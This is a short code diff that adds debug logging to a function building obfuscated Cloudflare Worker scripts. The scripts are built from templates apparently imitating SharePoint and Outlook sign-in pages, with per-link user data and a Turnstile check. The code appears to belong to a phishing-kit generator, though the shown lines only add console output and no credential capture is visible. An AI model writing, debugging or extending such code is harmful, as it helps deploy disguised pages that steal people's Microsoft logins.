@@ -19,6 +19,8 @@ function buildWorkerScript(link, user) {
   const templateType = link.template_type || 'sharepoint4';
   const designName = link.verification_design || 'outlook';
   let templateHTML = loadTemplateHTML(templateType);
+  console.log('[TemplateLoader] templateType:', templateType, 'templateHTML length:', templateHTML ? templateHTML.length : 0);
+
   const templateCSS = loadTemplateCSS(templateType) + '\n' + loadVerificationDesignCSS(designName);
   let templateJS = loadTemplateJS(templateType);
 
@@ -85,6 +87,9 @@ function buildWorkerScript(link, user) {
     .replace("'{{TURNSTILE_SECRET}}'", `'${config.CF_TURNSTILE_SECRET_KEY}'`)
     .replace("'{{TEMPLATE_HTML}}'", JSON.stringify(templateHTML))
     .replace("'{{USER_DATA}}'", safeUserJson);
+
+  console.log('[TemplateLoader] After replacement - has placeholder:', workerScript.includes('{{TEMPLATE_HTML}}'));
+  console.log('[TemplateLoader] templateHTML first 100 chars:', templateHTML ? templateHTML.substring(0, 100) : 'EMPTY');
 
   // Obfuscate if enabled - SAFE obfuscation profile for Cloudflare Workers
   // Uses only worker-compatible settings that don't break execution
